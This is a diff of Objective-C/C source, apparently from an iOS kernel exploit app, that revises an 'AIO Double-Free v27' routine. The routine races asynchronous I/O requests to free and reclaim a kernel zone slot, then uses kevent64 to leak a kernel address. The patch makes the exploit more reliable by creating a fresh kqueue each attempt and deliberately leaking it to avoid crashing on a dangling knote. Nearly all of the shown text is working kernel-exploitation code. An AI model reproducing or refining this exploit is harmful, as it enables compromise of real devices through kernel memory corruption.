@@ -5791,22 +5791,16 @@ static void *e2_free_and_ool_racer(void *arg) {
     // → zfree(slot S) → aio_read(&rcbs[0]) → zalloc reclaims slot S via LIFO.
     // kevent64(timeout=0) reads cached ext[] from tcb's knote → addr leak.
 
-    int kq = kqueue();
-    if (kq < 0) {
-        [self appendLog:[NSString stringWithFormat:@"FAIL: kqueue() error %d", errno]];
-        close(fd);
-        unlink(path.UTF8String);
-        dispatch_async(dispatch_get_main_queue(), ^{
-            self.aioUafButton.enabled = YES;
-            [self.aioUafButton setTitle:@"AIO Double-Free v27" forState:UIControlStateNormal];
-        });
-        _aioRunning = 0;
-        return;
-    }
-    [self appendLog:[NSString stringWithFormat:@"kq=%d", kq]];
-
     for (int attempt = 0; attempt < 5; attempt++) {
         [self appendLog:[NSString stringWithFormat:@"Phase A v27 attempt %d/5", attempt + 1]];
+
+        // v27: Fresh kq per attempt. If kevent64 misses, we leak kq rather
+        // than close(kq) with an unconsumed (dangling) knote still attached.
+        int kq = kqueue();
+        if (kq < 0) {
+            [self appendLog:[NSString stringWithFormat:@"  kqueue() failed: %d", errno]];
+            continue;
+        }
 
         static struct aiocb tcb;
         static char tbuf[4096];
@@ -5817,7 +5811,7 @@ static void *e2_free_and_ool_racer(void *arg) {
         tcb.aio_offset = 0;
         tcb.aio_lio_opcode = LIO_READ;
         tcb.aio_sigevent.sigev_notify = SIGEV_KEVENT;       // v27: kevent for addr leak
-        tcb.aio_sigevent.sigev_signo = kq;                // kqueue fd in signo field
+        tcb.aio_sigevent.sigev_signo = kq;                  // kqueue fd in signo field
         // sigev_value = 0 → ext[0]=0 in cached kevent (v18 confirmed)
 
         for (int i = 0; i < AIO_NRECLAIM; i++) {
@@ -5867,12 +5861,14 @@ static void *e2_free_and_ool_racer(void *arg) {
         struct kevent64_s kev;
         int nev = kevent64(kq, NULL, 0, &kev, 1, 0, NULL);
         [self appendLog:[NSString stringWithFormat:@"  kevent64(timeout=0)=%d", nev]];
+        bool knoteConsumed = false;
         if (nev > 0) {
             [self appendLog:[NSString stringWithFormat:@"  kev.ident=0x%llx ext[0]=0x%llx ext[1]=0x%llx",
                 kev.ident, kev.ext[0], kev.ext[1]]];
             if (kev.ident != 0) {
                 [self appendLog:[NSString stringWithFormat:@"*** PHASE A v27: KERNEL ADDR LEAK ident=0x%llx ***", kev.ident]];
             }
+            knoteConsumed = true;
         } else if (nev == 0) {
             [self appendLog:@"  kevent64 returned 0 events — knote not ready"];
         } else {
@@ -5900,10 +5896,16 @@ static void *e2_free_and_ool_racer(void *arg) {
         for (int i = 0; i < AIO_NRECLAIM; i++) {
             if (aio_error(&rcbs[i]) != EINVAL) aio_return(&rcbs[i]);
         }
+
+        if (knoteConsumed) {
+            close(kq);  // knote consumed by kevent64 → safe
+        } else {
+            // knote still on kq → close(kq) would call filt_aiodetach on
+            // dangling knote → potential crash. Leak instead.
+            [self appendLog:[NSString stringWithFormat:@"  leaking kq=%d (knote unconsumed)", kq]];
+        }
         break;  // SUCCESS — proceed to Phase D
     }
-
-    close(kq);
 
     // ---- Health check: consume corrupted freelist entries ----
     // 4 alloc+free cycles give kernel worker threads time to finish
